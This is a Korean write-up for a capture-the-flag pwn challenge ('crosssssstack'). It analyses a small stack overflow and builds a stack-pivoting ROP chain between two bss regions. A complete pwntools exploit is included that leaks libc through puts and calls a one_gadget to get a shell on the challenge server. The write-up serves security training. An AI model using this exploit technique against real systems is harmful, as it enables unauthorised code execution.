# pwn / crosssssstack
## 태그

- 스택 피보팅, ROP

## 보호기법

```bash
[*] '/mnt/d/hk/dreamhack/pwn/myprob/shield_safe/make_prob/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

PIE가 꺼져있고, canary가 없습니다.

## 프로그램 분석

```C
int pwn()
{
    check();
    char buf[0x10];
    puts("If you write your name, I'll remember you for not being able to pwn this program.");
    puts("> ");
    read(0, buf, 0x28);
}
```

`bof`가 발생합니다. 근데 좀 작게 일어납니다. SFP + RET + 8바이트를 덮을 정도입니다.

```C
void check()
{
    for (int i = 0; i < 0x10; i++)
    {
        if (cnt[i] != 0)
        {
            puts("only one chance.");
            exit(0);
        }
        cnt[i] = 1;
    }
}
```

`pwn`이 다시 실행되는지 확인합니다. cnt\[i\] != 0 인 게 하나라도 있다면 프로그램을 종료합니다.

## 익스플로잇 설계

Ret2main을 하면 됩니다. `check`에서 pwn 함수가 여러 번 실행되는지를 체크하는데, 이는 그냥 무시하고 그 뒤로 뛰면 됩니다. 가장 중요한 건 read size가 0x28이라는 너무 작은 크기입니다. 바로 가젯을 체이닝할 순 없고, pwn을 여러 번 실행하면서 체이닝해야 합니다.
그런데 rsp가 rbp 바로 뒤에서 함수를 실행하는 경우 에러가 발생할 수 있고(경험적으로 깨달았으며, 본 문제도 rsp가 rbp + 0x18일 때 read 함수에서 오류가 납니다.) 따라서 sfp 조작을 통해 bss 영역을 두 곳을 오가며 문제를 해결합니다. 자세히 설명하면, 어떤 주소를 `bss`라 할 때 `bss`에 체이닝을 하면서, 가젯 하나를 체이닝 할 때마다 rbp를 `bss + 0x100`로 옮겨 rsp를 rbp 가까이하지 않게 하면서 에러가 나지 않게 합니다.
- 이 부분은 gdb에서 read 함수 내부를 자세히 보시면 이해하기 쉽습니다. 라이브러리 함수는 레지스터나 기타 중요한 값을 보존하기 위해 함수의 처음에 값을 push, 함수의 마지막에 pop 하는 방식을 사용합니다. 이 때 rsp의 주소가 정상적이지 않은 곳을 가리킨다면 스택에 써진 값들이 pop되어 레지스터나 ret 부분을 이상하게 바꾸어 프로그램이 비정상적으로 종료될 수 있습니다.

원리를 깨달았다면 그냥 ROP와 같습니다. libc\_base를 구하고, 원가젯 조건을 맞추며 원가젯을 실행시킵니다.

## exploit

payload가 어떤 주소에 적히는 것인지는 주석에 적어놓았습니다. 참고하시기 바랍니다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 22648)
e = ELF('./prob')
l = ELF('./libc.so.6')

ad = 0x401290 # Address after call check
bss = e.bss() + 0x500
pop_rdi = 0x401203
mov_rax = 0x40113f

# [1] set two two bss parts - bss : p1, bss + 0x100 : p2
payload = b'a' * 0x10 + p64(bss) + p64(ad)
p.sendafter(b'program.', payload)

payload = b'a' * 0x10 + p64(bss + 0x100) + p64(ad)
p.sendafter(b'program.', payload)

payload = b'a' * 0x10 + p64(bss - 8) + p64(ad)
p.sendafter(b'program.', payload)

# [2] write payload
# [2-1] write libc address leak payload in p1 -> go to p2
payload = b'a' * 0x10 + p64(bss + 0x100) + p64(ad) + p64(ad)
p.sendafter(b'program.', payload)

# [2-2] go to p1
payload = b'a' * 0x10 + p64(bss - 0x10) + p64(ad)
p.sendafter(b'program.', payload)

# [2-1] write libc address leak payload in p1 -> go to p2
payload = b'a' * 0x10 + p64(bss + 0x100) + p64(ad) + p64(e.sym['puts'])
p.sendafter(b'program.', payload)

# [2-2] go to p1
payload = b'a' * 0x10 + p64(bss - 0x18) + p64(ad)
p.sendafter(b'program.', payload)

# [2-1] write libc address leak payload in p1 and execute -> go to p2
payload = b'a' * 0x10 + p64(bss + 0x100) + p64(pop_rdi) + p64(e.got['puts'])
p.sendafter(b'program.', payload)
l.address = u64(p.recvn(7)[1:].ljust(8, b'\x00')) - l.sym['puts']
print(f"libc_base = {hex(l.address)}")
og = l.address + 0xebd43

# [3] call one_gadget
payload = b'a' * 0x10 + p64(bss + 0x400) + p64(mov_rax) + p64(og)
p.sendafter(b'program.', payload)
p.interactive()
```

- 마지막에 rbp를 코드 영역과 너무 가까운 주소로 설정한다면 unreadable 주소에 접근하여 원가젯 호출에 실패할 수 있습니다.